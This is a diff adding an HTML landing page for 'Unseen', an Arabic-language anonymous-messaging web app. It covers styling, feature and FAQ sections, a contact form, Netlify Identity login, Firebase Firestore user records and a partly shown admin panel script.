@@ -1,0 +1,1311 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Unseen — الصفحة التعريفية</title>
+
+  <!-- Fonts & Icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <!-- Netlify Identity Widget -->
+  <script type="text/javascript" src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script>
+
+  <style>
+    :root{
+      --primary:#5a3fff;
+      --accent:#06b6d4;
+      --muted:#64748b;
+      --bg:#ffffff;
+      --card:rgba(10,11,13,0.04);
+      --radius:14px;
+    }
+    [dir="ltr"]{ --flow:row; }
+    [dir="rtl"]{ --flow:row-reverse; }
+
+    *{box-sizing:border-box}
+    html,body{height:100%;}
+    body{
+      margin:0;
+      font-family:"Cairo", system-ui, -apple-system, "Inter", sans-serif;
+      background:var(--bg);
+      color:#081029;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      transition:background .25s,color .25s;
+    }
+    body.dark{ --bg:#07102a; background:#07102a; color:#e6eef8; }
+
+    header{display:flex;align-items:center;justify-content:space-between;padding:16px 20px;gap:12px}
+    .brand{display:flex;align-items:center;gap:12px}
+    .logo{display:inline-flex;align-items:center;justify-content:center;width:70px !important;height:70px !important;border-radius:10px;overflow:hidden;background:none !important}
+  .logo img {
+    width: 100% !important;
+    height: 100% !important;
+    object-fit: cover !important;
+    padding: 0 !important;
+}
+    .brand h1{margin:0;font-size:1.05rem}
+    nav{display:flex;gap:12px;align-items:center}
+    nav a{color:inherit;text-decoration:none;padding:8px 10px;border-radius:10px;font-weight:600}
+    .controls{display:flex;gap:8px;align-items:center}
+    .icon-btn{background:none;border:1px solid transparent;padding:8px;border-radius:10px;cursor:pointer}
+    .icon-btn:hover{transform:translateY(-1px)}
+
+    /* Mobile menu */
+    .hamburger{display:none;background:none;border:none;font-size:22px}
+    .mobile-nav{display:none;position:absolute;right:16px;left:16px;top:72px;background:var(--bg);border-radius:12px;padding:12px;box-shadow:0 6px 24px rgba(8,16,41,0.08);z-index:50}
+
+    .hero{padding:48px 20px;text-align:center}
+    .hero-inner{max-width:980px;margin:0 auto;display:grid;grid-template-columns:1fr;gap:18px;align-items:center}
+    .eyebrow{display:inline-block;background:rgba(90,63,255,0.08);color:var(--primary);padding:6px 10px;border-radius:999px;font-weight:700}
+    .hero h2{font-size:2.1rem;margin:6px 0}
+    .hero p{color:var(--muted);margin:0 0 12px}
+    .hero-actions{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+    .btn{display:inline-flex;gap:10px;align-items:center;padding:12px 16px;border-radius:12px;border:none;cursor:pointer;font-weight:700}
+    .btn-primary{background:linear-gradient(90deg,var(--primary),var(--accent));color:white}
+    .btn-ghost{background:transparent;border:1px solid rgba(8,16,41,0.06);color:inherit}
+
+    .profile-link{display:inline-flex;gap:8px;align-items:center;padding:8px 12px;border-radius:999px;background:var(--card);font-weight:600}
+
+    /* Features grid */
+    .features{padding:20px;max-width:1100px;margin:6px auto;display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+    .card{background:var(--card);padding:18px;border-radius:12px;box-shadow:0 6px 18px rgba(8,16,41,0.04);transition:transform .2s,box-shadow .2s}
+    .card:hover{transform:translateY(-6px);box-shadow:0 24px 52px rgba(8,16,41,0.06)}
+    .card .material-icons{font-size:28px;color:var(--accent);display:block;margin-bottom:10px}
+    .card h3{margin:0 0 6px;font-size:1.05rem}
+    .card p{margin:0;color:var(--muted);font-size:0.95rem}
+
+    /* Stats */
+    .stats{display:flex;gap:12px;justify-content:center;padding:18px;flex-wrap:wrap}
+    .stat{background:linear-gradient(180deg,rgba(255,255,255,0.6),rgba(255,255,255,0.4));padding:12px 16px;border-radius:12px;text-align:center;min-width:120px}
+    .stat strong{display:block;font-size:1.4rem}
+    .muted{color:var(--muted)}
+
+    /* Testimonials */
+    .testimonials{padding:18px 20px;max-width:1000px;margin:0 auto}
+    .test-container{position:relative;overflow:hidden;border-radius:12px}
+    .test-list{display:flex;transition:transform .45s ease}
+    .test{min-width:100%;Padding:22px;background:var(--card);display:flex;gap:14px;align-items:flex-start}
+    .avatar{width:56px;height:56px;border-radius:50%;background:linear-gradient(90deg,var(--primary),var(--accent));color:white;display:grid;place-items:center;font-weight:700}
+
+    /* FAQ */
+    .faq{max-width:900px;margin:18px auto;padding:0 20px}
+    .faq-item{background:var(--card);border-radius:10px;padding:12px;margin-bottom:8px}
+    .faq-item summary{font-weight:700;cursor:pointer}
+    summary::-webkit-details-marker{display:none}
+
+    /* Contact modal */
+    .modal{position:fixed;inset:0;display:none;place-items:center;background:rgba(2,6,23,0.5);z-index:60}
+    .modal.open{display:grid}
+    .modal-card{background:var(--bg);padding:18px;border-radius:12px;width:380px;max-width:94%}
+    .form-group{display:flex;flex-direction:column;gap:6px;margin-bottom:10px}
+    input,textarea{padding:10px;border-radius:8px;border:1px solid rgba(8,16,41,0.06);font-family:inherit}
+
+    /* Auth Modal */
+    .auth-modal-card{background:var(--bg);padding:22px;border-radius:12px;width:360px;max-width:94%;position:relative}
+    .auth-options{display:flex;flex-direction:column;gap:12px;margin:16px 0}
+    .auth-btn{display:flex;align-items:center;justify-content:center;gap:10px;padding:12px;border-radius:10px;border:1px solid rgba(8,16,41,0.08);background:var(--card);cursor:pointer;transition:all 0.2s}
+    .auth-btn:hover{background:rgba(90,63,255,0.06);border-color:var(--primary)}
+    .auth-btn.google{background:#fff;border:1px solid #dadce0}
+    .auth-divider{display:flex;align-items:center;gap:10px;margin:16px 0;color:var(--muted)}
+    .auth-divider::before,.auth-divider::after{content:'';flex:1;height:1px;background:rgba(8,16,41,0.1)}
+    .auth-footer{text-align:center;margin-top:16px;color:var(--muted);font-size:0.9rem}
+
+    .email-form{display:flex;flex-direction:column;gap:10px}
+    .email-form .small-note{font-size:0.9rem;color:var(--muted);text-align:center}
+    .auth-toggle{background:none;border:none;color:var(--primary);cursor:pointer;font-weight:700}
+
+    footer{padding:20px;text-align:center;color:var(--muted)}
+    .socials{display:flex;gap:10px;justify-content:center;margin-top:8px}
+    .socials a{display:inline-flex;padding:8px;border-radius:10px}
+
+    /* back to top */
+    .back-to-top{position:fixed;left:18px;bottom:18px;border-radius:999px;padding:10px;display:none;z-index:80}
+    .back-to-top.show{display:inline-flex}
+
+    /* Admin Panel */
+    .admin-panel{display:none;position:fixed;top:0;right:0;bottom:0;width:320px;background:var(--bg);z-index:100;box-shadow:-4px 0 20px rgba(0,0,0,0.1);padding:20px;overflow-y:auto}
+    .admin-panel.open{display:block}
+    .admin-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
+    .admin-section{margin-bottom:20px}
+    .admin-list{list-style:none;padding:0;margin:0}
+    .admin-list li{padding:10px;border-bottom:1px solid rgba(0,0,0,0.1);display:flex;justify-content:space-between;align-items:center}
+    .admin-actions{display:flex;gap:8px}
+
+    /* Toast notifications */
+    .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:var(--primary);color:white;padding:12px 20px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.15);z-index:1000;display:none;align-items:center;gap:10px}
+    .toast.show{display:flex;animation:fadeInUp 0.3s ease}
+    @keyframes fadeInUp{from{opacity:0;transform:translate(-50%,20px)} to{opacity:1;transform:translate(-50%,0)}}
+
+    /* Loading spinner */
+    .spinner{display:inline-block;width:20px;height:20px;border:2px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 1s ease-in-out infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    /* Netlify Identity customization */
+    .netlify-identity-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      background: rgba(0, 0, 0, 0.5);
+    }
+    
+    .netlify-identity-modal {
+      background: var(--bg);
+      border-radius: 12px;
+      padding: 20px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+    }
+    
+    .netlify-identity-close {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: none;
+      border: none;
+      font-size: 20px;
+      cursor: pointer;
+    }
+
+    /* responsive */
+    @media (max-width:900px){
+      header{padding:12px}
+      .hero h2{font-size:1.6rem}
+      .hamburger{display:inline-block}
+      nav{display:none}
+      .mobile-nav{display:none}
+      .admin-panel{width:100%}
+    }
+    #privacy-modal .modal-card {
+  animation: slideInUp 0.4s ease-out;
+}
+
+@keyframes slideInUp {
+  from {
+    opacity: 0;
+    transform: translateY(30px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+    
+#reject-terms {
+  border: 1px solid rgba(239, 68, 68, 0.3);
+  color: #ef4444;
+}
+
+#reject-terms:hover {
+  background: rgba(239, 68, 68, 0.1);
+}
+  </style>
+</head>
+<body>
+  <header>
+    <div class="brand">
+      <div class="logo" aria-hidden>
+  <img src="https://i.postimg.cc/3wZP4sFW/20250912-1551-Unseen-Logo-Design-simple-compose-01k4yzn1nkf06sr1z9nxvtm7gc-1.png" alt="Unseen Logo" style="width:100%;height:100%;object-fit:contain;padding:6px">
+</div>
+      <div>
+        <h1>Unseen</h1>
+        <div class="muted" style="font-size:12px">رسائل مجهولة — خصوصية أولاً</div>
+      </div>
+    </div>
+
+    <nav aria-label="القائمة الرئيسية">
+      <a href="#features">المزايا</a>
+      <a href="#testimonials">آراء</a>
+      <a href="#faq">الأسئلة</a>
+      <a href="#contact" id="contact-link">تواصل</a>
+    </nav>
+
+    <div class="controls">
+      <button class="icon-btn" id="lang-toggle" title="تبديل اللغة"><span class="material-icons">translate</span></button>
+      <button class="icon-btn" id="theme-toggle" title="تبديل الثيم"><span class="material-icons">dark_mode</span></button>
+      <button class="icon-btn" id="profile-copy" title="انسخ رابط ملفك"><span class="material-icons">link</span></button>
+
+      <!-- Netlify auth controls -->
+      <button class="icon-btn" id="auth-btn" title="تسجيل/حساب"><span class="material-icons">person</span></button>
+<button class="icon-btn" id="signout-btn" title="تسجيل خروج" style="display:none">
+    <span class="material-icons">exit_to_app</span>
+</button>
+      
+      <!-- Admin panel toggle (visible only for admins) -->
+      <button class="icon-btn" id="admin-btn" title="لوحة التحكم" style="display:none"><span class="material-icons">admin_panel_settings</span></button>
+
+      <button class="hamburger" id="hamburger" aria-label="قائمة"> <span class="material-icons">menu</span></button>
+    </div>
+
+    <div class="mobile-nav" id="mobile-nav" aria-hidden>
+      <a href="#features">المزايا</a><br>
+      <a href="#testimonials">آراء المستخدمين</a><br>
+      <a href="#faq">الأسئلة</a><br>
+      <a href="#contact" id="contact-link-2">تواصل</a>
+    </div>
+  </header>
+
+  <main>
+    <section class="hero" id="home">
+      <div class="hero-inner">
+        <div style="text-align:center">
+          <span class="eyebrow">جديد</span>
+          <h2 id="hero-title">قلها. وأنت غير مرئي.</h2>
+          <p id="hero-subtext">احصل على رسائل مجهولة من أصدقائك — ممتعة، حقيقية، وخاصة دائمًا.</p>
+
+          <div class="hero-actions">
+            <button class="btn btn-primary" id="cta-btn"><span class="material-icons">send</span><span id="cta-text">ابدأ الآن</span></button>
+            <button class="btn btn-ghost" id="open-contact"><span class="material-icons">support_agent</span>تواصل معنا</button>
+            <div class="profile-link" title="رابط ملفك" id="profile-link">
+              <span id="profile-link-text">unseen.app/u/yourname</span>
+              <button id="copy-btn" class="icon-btn" style="margin-inline-start:6px"><span class="material-icons">content_copy</span></button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- STATS -->
+    <section class="stats" aria-label="إحصاءات">
+      <div class="stat"><span class="muted">رسائل اليوم</span><strong id="stat-messages">1,248</strong></div>
+      <div class="stat"><span class="muted">مستخدمون</span><strong id="stat-users">5,432</strong></div>
+      <div class="stat"><span class="muted">متوسط تقييم</span><strong id="stat-rating">4.8★</strong></div>
+    </section>
+
+    <!-- FEATURES -->
+    <section class="features" id="features" aria-labelledby="features-title">
+      <h2 id="features-title" style="grid-column:1/-1;text-align:center">مزايا Unseen</h2>
+
+      <div class="card">
+        <span class="material-icons">person_add</span>
+        <h3>أنشئ ملفك</h3>
+        <p>حساب سريع وبسيط مع إعدادات خصوصية متقدمة.</p>
+      </div>
+
+      <div class="card">
+        <span class="material-icons">link</span>
+        <h3>شارك الرابط</h3>
+        <p>انسخ رابط ملفك أو شاركه مباشرة عبر التطبيقات.</p>
+      </div>
+
+      <div class="card">
+        <span class="material-icons">mail</span>
+        <h3>استقبل رسائل مجهولة</h3>
+        <p>واجهة قراءة آمنة ومريحة، مع فلترة للرسائل المسيئة.</p>
+      </div>
+
+      <div class="card">
+        <span class="material-icons">shield</span>
+        <h3>حماية وخصوصية</h3>
+        <p>سياسة خصوصية واضحة وخيارات حظر وإخفاء المتابعين.</p>
+      </div>
+
+      <div class="card">
+        <span class="material-icons">bolt</span>
+        <h3>تحليلات سريعة</h3>
+        <p>مقاييس بسيطة لقياس تفاعل الأصدقاء والرسائل الأكثر شيوعًا.</p>
+      </div>
+
+      <div class="card">
+        <span class="material-icons">autorenew</span>
+        <h3>تصفية ذكية</h3>
+        <p>خوارزمية تمنع الكلمات المسيئة وتوفر تجربة آمنة.</p>
+      </div>
+
+      <div class="card">
+        <span class="material-icons">share</span>
+        <h3>نشر آمن</h3>
+        <p>خيارات مشاركة مضمّنة ونصائح لكتابة روابط ذكية.</p>
+      </div>
+
+      <div class="card">
+        <span class="material-icons">settings</span>
+        <h3>تحكم كامل</h3>
+        <p>إعدادات مرنة: من يكتب لك، من يرى ملفك، ومتى يكون رابطك نشطًا.</p>
+      </div>
+    </section>
+
+    <!-- Testimonials -->
+    <section class="testimonials" id="testimonials">
+      <h2 style="text-align:center">آراء المستخدمين</h2>
+      <div class="test-container" aria-live="polite">
+        <div class="test-list" id="test-list">
+          <div class="test">
+            <div class="avatar">A</div>
+            <div>
+              <strong>أحمد</strong>
+              <p class="muted">"منصة بسيطة وممتعة — أحببت الخصوصية وسهولة المشاركة."</p>
+            </div>
+          </div>
+
+          <div class="test">
+            <div class="avatar">L</div>
+            <div>
+              <strong>ليلى</strong>
+              <p class="muted">"الفلترة ممتازة، وصلتني رسائل جيدة بدون إساءة."</p>
+            </div>
+          </div>
+
+          <div class="test">
+            <div class="avatar">M</div>
+            <div>
+              <strong>محمد</strong>
+              <p class="muted">"التصميم عملي وسهل الاستخدام على الموبايل."</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- FAQ -->
+    <section class="faq" id="faq">
+      <h2 style="text-align:center">الأسئلة الشائعة</h2>
+      <div class="faq-item">
+        <details>
+          <summary>هل الرسائل فعلاً مجهولة؟</summary>
+          <div class="muted">نعم — نحن لا نشارك الهوية مع صاحب الملف، ويمكن للمستخدم حظر الرسائل المسيئة.</div>
+        </details>
+      </div>
+
+      <div class="faq-item">
+        <details>
+          <summary>كيف أحذف ملفي نهائيًا؟</summary>
+          <div class="muted">من إعدادات الملف اضغط "حذف الحساب"، ستُحذف البيانات بعد تأكيدك.</div>
+        </details>
+      </div>
+
+      <div class="faq-item">
+        <details>
+          <summary>هل يمكنني استرجاع رسالة محذوفة؟</summary>
+          <div class="muted">لا — عند الحذف يتم إزالتها نهائيًا لأسباب تتعلق بالخصوصية.</div>
+        </details>
+      </div>
+    </section>
+
+    <!-- Contact Modal -->
+    <div class="modal" id="contact-modal" aria-hidden="true">
+      <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="contact-title">
+        <h3 id="contact-title">تواصل معنا</h3>
+        <form id="contact-form">
+          <div class="form-group">
+            <label for="name">الاسم</label>
+            <input id="name" name="name" placeholder="اسمك" required>
+          </div>
+          <div class="form-group">
+            <label for="email">البريد الإلكتروني</label>
+            <input id="email" name="email" type="email" placeholder="example@mail.com" required>
+          </div>
+          <div class="form-group">
+            <label for="message">الرسالة</label>
+            <textarea id="message" name="message" rows="4" placeholder="ملاحظتك أو سؤالك" required></textarea>
+          </div>
+          <div style="display:flex;gap:8px;justify-content:flex-end">
+            <button type="button" class="btn btn-ghost" id="close-modal">إلغاء</button>
+            <button type="submit" class="btn btn-primary">أرسل</button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <!-- Admin Panel -->
+    <div class="admin-panel" id="admin-panel">
+      <div class="admin-header">
+        <h3>لوحة التحكم</h3>
+        <button class="icon-btn" id="close-admin-panel"><span class="material-icons">close</span></button>
+      </div>
+      
+      <div class="admin-section">
+        <h4>الرسائل المبلغ عنها</h4>
+        <ul class="admin-list" id="reported-messages">
+          <li>يتم التحميل...</li>
+        </ul>
+      </div>
+      
+      <div class="admin-section">
+        <h4>المستخدمون النشطون</h4>
+        <ul class="admin-list" id="active-users">
+          <li>يتم التحميل...</li>
+        </ul>
+      </div>
+      
+      <div class="admin-section">
+        <h4>إحصائيات النظام</h4>
+        <div class="muted" id="system-stats">يتم التحميل...</div>
+      </div>
+    </div>
+
+  </main>
+
+  <footer>
+    <div>© 2025 Unseen · جميع الحقوق محفوظة</div>
+    <div class="socials" aria-label="روابط التواصل">
+      <a href="#" aria-label="انستجرام"><span class="material-icons">instagram</span></a>
+      <a href="#" aria-label="تيليجرام"><span class="material-icons">send</span></a>
+      <a href="#" aria-label="تويتر"><span class="material-icons">twitter</span></a>
+    </div>
+  </footer>
+
+  <button class="back-to-top icon-btn" id="back-to-top" aria-label="ارجع لأعلى"><span class="material-icons">arrow_upward</span></button>
+
+  <!-- Toast notification -->
+  <div class="toast" id="toast">
+    <span id="toast-message"></span>
+  </div>
+
+  <!-- Firebase (compat) SDKs - إزالة Firebase Authentication -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-functions-compat.js"></script>
+
+  <script>
+    /**************************
+     * إعداد Firebase هنا (بدون Authentication)
+     **************************/
+    const firebaseConfig = {
+      apiKey: "AIzaSyB7uWrWJ1v_o3fqx0442wIkrAfTnPn84Mo",
+      authDomain: "unseen-93dd8.firebaseapp.com",
+      projectId: "unseen-93dd8",
+      storageBucket: "unseen-93dd8.firebasestorage.app",
+      messagingSenderId: "142670337449",
+      appId: "1:142670337449:web:f41e9b5ebbb433378060b8",
+      measurementId: "G-SPL7YN9LZ1"
+    };
+
+    // Initialize Firebase بدون Authentication
+    const app = firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+    const functions = firebase.functions();
+
+    // DOM Elements
+    const langToggle = document.getElementById('lang-toggle');
+    const themeToggle = document.getElementById('theme-toggle');
+    const bodyEl = document.body;
+    const ctaBtn = document.getElementById('cta-btn');
+    const openContact = document.getElementById('open-contact');
+    const contactModal = document.getElementById('contact-modal');
+    const closeModal = document.getElementById('close-modal');
+    const contactForm = document.getElementById('contact-form');
+    const copyBtn = document.getElementById('copy-btn');
+    const profileLinkText = document.getElementById('profile-link-text');
+    const authBtn = document.getElementById('auth-btn');
+    const signoutBtn = document.getElementById('signout-btn');
+    const adminBtn = document.getElementById('admin-btn');
+    const adminPanel = document.getElementById('admin-panel');
+    const closeAdminPanel = document.getElementById('close-admin-panel');
+    const hamburger = document.getElementById('hamburger');
+    const mobileNav = document.getElementById('mobile-nav');
+    const toast = document.getElementById('toast');
+    const toastMessage = document.getElementById('toast-message');
+    
+    // Texts (Arabic default + English)
+    const texts = {
+      ar:{
+        heroTitle: 'قلها. وأنت غير مرئي.',
+        heroSub: 'احصل على رسائل مجهولة من أصدقائك — ممتعة، حقيقية، وخاصة دائمًا.',
+        cta: 'ابدأ الآن',
+        ctaLoggedIn: 'ملفي الشخصي',
+        contact:'تواصل معنا',
+        profileDefault:'unseen.app/u/yourname',
+        copied: 'تم نسخ الرابط',
+        copyFailed: 'لم يتم النسخ',
+        messageSent: 'تم إرسال الرسالة — شكرًا لك!',
+        sendError: 'خطأ في الإرسال: ',
+        fillRequired: 'املأ الحقول المطلوبة',
+        setupProfile: 'يمكنك الآن إعداد ملفك ومشاركة الرابط',
+        adminPanel: 'لوحة التحكم',
+        loading: 'جاري التحميل...',
+        login: 'تسجيل الدخول',
+        logout: 'تسجيل خروج'
+      },
+      en:{
+        heroTitle: 'Say it. Stay Unseen.',
+        heroSub: 'Get anonymous messages from friends — fun, real, always private.',
+        cta: 'Get Started',
+        ctaLoggedIn: 'My Profile',
+        contact:'Contact us',
+        profileDefault:'unseen.app/u/yourname',
+        copied: 'Link copied',
+        copyFailed: 'Copy failed',
+        messageSent: 'Message sent — thank you!',
+        sendError: 'Send error: ',
+        fillRequired: 'Please fill required fields',
+        setupProfile: 'Now you can set up your profile and share the link.',
+        adminPanel: 'Admin Panel',
+        loading: 'Loading...',
+        login: 'Login',
+        logout: 'Logout'
+      }
+    };
+
+    // حفظ الإعدادات في localStorage
+    function saveSettings() {
+      localStorage.setItem('language', currentLang);
+      localStorage.setItem('theme', bodyEl.classList.contains('dark') ? 'dark' : 'light');
+    }
+
+    // تحميل الإعدادات من localStorage
+    function loadSettings() {
+      const savedLang = localStorage.getItem('language');
+      const savedTheme = localStorage.getItem('theme');
+      
+      if (savedLang) {
+        currentLang = savedLang;
+      }
+      
+      if (savedTheme === 'dark') {
+        bodyEl.classList.add('dark');
+        themeToggle.querySelector('span').textContent = 'light_mode'; // تغيير الأيقونة عند التحميل
+      } else {
+        themeToggle.querySelector('span').textContent = 'dark_mode';
+      }
+      
+      applyLang();
+    }
+
+    let currentLang = 'ar';
+    
+    function applyLang(){
+      document.documentElement.lang = currentLang;
+      document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
+      const t = texts[currentLang];
+      document.getElementById('hero-title').innerText = t.heroTitle;
+      document.getElementById('hero-subtext').innerText = t.heroSub;
+      
+      // تحديث نص زر CTA بناءً على حالة المستخدم
+      updateCtaButton(netlifyIdentity.currentUser());
+      
+      // تحديث العناصر بشكل صحيح
+      if (profileLinkText) {
+        profileLinkText.textContent = t.profileDefault;
+      }
+      
+      // تحديث نصوص الأزرار
+      authBtn.setAttribute('title', currentLang === 'ar' ? 'تسجيل/حساب' : 'Login/Account');
+      signoutBtn.setAttribute('title', currentLang === 'ar' ? 'تسجيل خروج' : 'Logout');
+      
+      
+      // حفظ الإعدادات
+      saveSettings();
+    }
+    
+    // تحديث نص زر CTA بناءً على حالة المستخدم
+    function updateCtaButton(user) {
+      const ctaTextEl = document.getElementById('cta-text');
+      if (user) {
+        ctaTextEl.textContent = texts[currentLang].ctaLoggedIn;
+      } else {
+        ctaTextEl.textContent = texts[currentLang].cta;
+      }
+    }
+    
+    // إظهار إشعار Toast
+    function showToast(message, duration = 3000) {
+      toastMessage.textContent = message;
+      toast.classList.add('show');
+      
+      setTimeout(() => {
+        toast.classList.remove('show');
+      }, duration);
+    }
+
+    // إضافة event listeners للوظائف الأساسية
+    langToggle.addEventListener('click',()=>{
+      currentLang = currentLang === 'ar' ? 'en' : 'ar';
+      applyLang();
+    });
+
+    themeToggle.addEventListener('click',()=>{ 
+      bodyEl.classList.toggle('dark');
+      // تغيير الأيقونة بناءً على الوضع الحالي
+      if (bodyEl.classList.contains('dark')) {
+        themeToggle.querySelector('span').textContent = 'light_mode';
+      } else {
+        themeToggle.querySelector('span').textContent = 'dark_mode';
+      }
+      saveSettings();
+    });
+
+    // Mobile nav
+    hamburger.addEventListener('click',()=>{ 
+      mobileNav.style.display = mobileNav.style.display === 'block' ? 'none' : 'block'; 
+    });
+
+    // Contact modal
+    let activeModal = null;
+    let focusableElements = [];
+    let firstFocusableElement = null;
+    let lastFocusableElement = null;
+
+    function openModal(modal){ 
+      activeModal = modal;
+      modal.classList.add('open'); 
+      modal.setAttribute('aria-hidden','false');
+      
+      // إدارة التركيز داخل النافذة المنبثقة
+      focusableElements = Array.from(modal.querySelectorAll('button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'));
+      if (focusableElements.length > 0) {
+        firstFocusableElement = focusableElements[0];
+        lastFocusableElement = focusableElements[focusableElements.length - 1];
+        firstFocusableElement.focus();
+      }
+      
+      // منع التمرير خلف النافذة المنبثقة
+      document.body.style.overflow = 'hidden';
+      
+      // إضافة event listener لإدارة التركيز
+      modal.addEventListener('keydown', trapTabKey);
+    }
+    
+    function closeModalFn(){ 
+      if (activeModal) {
+        activeModal.classList.remove('open'); 
+        activeModal.setAttribute('aria-hidden','true');
+        activeModal.removeEventListener('keydown', trapTabKey);
+        activeModal = null;
+      }
+      
+      // إعادة التمرير
+      document.body.style.overflow = 'auto';
+    }
+    
+    // وظيفة لإدارة التركيز داخل النافذة المنبثقة
+    function trapTabKey(e) {
+      if (e.key !== 'Tab') return;
+      
+      if (e.shiftKey) {
+        if (document.activeElement === firstFocusableElement) {
+          e.preventDefault();
+          lastFocusableElement.focus();
+        }
+      } else {
+        if (document.activeElement === lastFocusableElement) {
+          e.preventDefault();
+          firstFocusableElement.focus();
+        }
+      }
+    }
+
+    openContact.addEventListener('click',() => openModal(contactModal));
+    document.getElementById('contact-link').addEventListener('click',(e)=>{ 
+      e.preventDefault(); 
+      openModal(contactModal);
+    });
+    document.getElementById('contact-link-2').addEventListener('click',(e)=>{ 
+      e.preventDefault(); 
+      openModal(contactModal);
+    });
+    closeModal.addEventListener('click',closeModalFn);
+    contactModal.addEventListener('click',(e)=>{ 
+      if(e.target === contactModal) closeModalFn(); 
+    });
+    document.addEventListener('keydown',(e)=>{ 
+      if(e.key==='Escape') closeModalFn(); 
+    });
+
+// دالة ensureUsername لإنشاء أو جلب اسم المستخدم
+ async function ensureUsername(user) {
+  try {
+    const userDoc = await db.collection('users').doc(user.id).get();
+    if (userDoc.exists) {
+      return userDoc.data().username || user.id;
+    } else {
+      // إنشاء مستند مستخدم جديد مع اسم مستخدم
+      const username = user.email ? user.email.split('@')[0] : 'user' + user.id.slice(0, 6);
+      await db.collection('users').doc(user.id).set({
+        uid: user.id,
+        username: username,
+        email: user.email || null,
+        createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+        isAdmin: false
+      });
+      return username;
+    }
+  } catch (error) {
+    console.error('Error ensuring username:', error);
+    return user.id;
+  }
+}
+    //داله ensureUserDoc
+    async function ensureUserDoc(user) {
+  const docRef = db.collection('users').doc(user.id);
+  const doc = await docRef.get();
+  
+  if(!doc.exists){
+    // استخدم ensureUsername للحصول على اسم مستخدم متسق
+    const username = await ensureUsername(user);
+    await docRef.set({
+      uid: user.id,
+      username: username,
+      email: user.email || null,
+      createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+      isAdmin: false
+        });
+    console.log('✅ مستخدم جديد تم إنشاؤه');
+  } else {
+    // مستخدم موجود - تحديث آخر دخول فقط
+    await docRef.update({
+      lastLogin: firebase.firestore.FieldValue.serverTimestamp()
+    });
+    console.log('✅ مستخدم موجود - تم تحديث آخر دخول');
+  }
+}
+    // Netlify Identity functions
+    function initNetlifyIdentity() {
+      // تهيئة Netlify Identity
+      netlifyIdentity.init();
+      
+      // إضافة مستمعي الأحداث
+      netlifyIdentity.on('init', user => {
+        updateAuthUI(user);
+      });
+      
+      netlifyIdentity.on('login', user => {
+        updateAuthUI(user);
+        ensureUserDoc(user);
+        updateProfileLink(user);
+        showToast(currentLang === 'ar' ? 'تم تسجيل الدخول بنجاح' : 'Logged in successfully');
+      });
+
+      
+      netlifyIdentity.on('logout', () => {
+        updateAuthUI(null);
+        showToast(currentLang === 'ar' ? 'تم تسجيل الخروج' : 'Logged out');
+        applyLang(); // إعادة تعيين رابط الملف الافتراضي
+      });
+      
+      netlifyIdentity.on('error', err => {
+        console.error('Netlify Identity Error:', err);
+        showToast(currentLang === 'ar' ? 'حدث خطأ في المصادقة' : 'Authentication error');
+      });
+    }
+    
+    function updateAuthUI(user) {
+      if (user) {
+        // المستخدم مسجل الدخول
+        authBtn.style.display = 'none';
+        signoutBtn.style.display = 'inline-flex';
+        
+        // تحديث نص زر CTA
+        updateCtaButton(user);
+        
+        // التحقق مما إذا كان المستخدم مسؤولاً
+        checkAdminStatus(user);
+      } else {
+        // المستخدم غير مسجل الدخول
+        authBtn.style.display = 'inline-flex';
+        signoutBtn.style.display = 'none';
+        adminBtn.style.display = 'none';
+        
+        // تحديث نص زر CTA
+        updateCtaButton(null);
+      }
+    }
+    
+    async function checkAdminStatus(user) {
+      try {
+        const userDoc = await db.collection('users').doc(user.id).get();
+        if (userDoc.exists && userDoc.data().isAdmin) {
+          adminBtn.style.display = 'inline-flex';
+        } else {
+          adminBtn.style.display = 'none';
+        }
+      } catch (error) {
+        console.error('Error checking admin status:', error);
+        adminBtn.style.display = 'none';
+      }
+    }
+    
+    // Admin panel functions
+    adminBtn.addEventListener('click', () => {
+      adminPanel.classList.add('open');
+      loadAdminData();
+    });
+    
+    closeAdminPanel.addEventListener('click', () => {
+      adminPanel.classList.remove('open');
+    });
+    
+    async function loadAdminData() {
+      const user = netlifyIdentity.currentUser();
+      if (!user) return;
+      
+      // التحقق من صلاحية المستخدم كمسؤول
+      try {
+        const userDoc = await db.collection('users').doc(user.id).get();
+        if (userDoc.exists && userDoc.data().isAdmin) {
+          // تحميل بيانات لوحة التحكم
+          document.getElementById('reported-messages').innerHTML = '<li>' + texts[currentLang].loading + '</li>';
+          document.getElementById('active-users').innerHTML = '<li>' + texts[currentLang].loading + '</li>';
+          document.getElementById('system-stats').textContent = texts[currentLang].loading;
+          
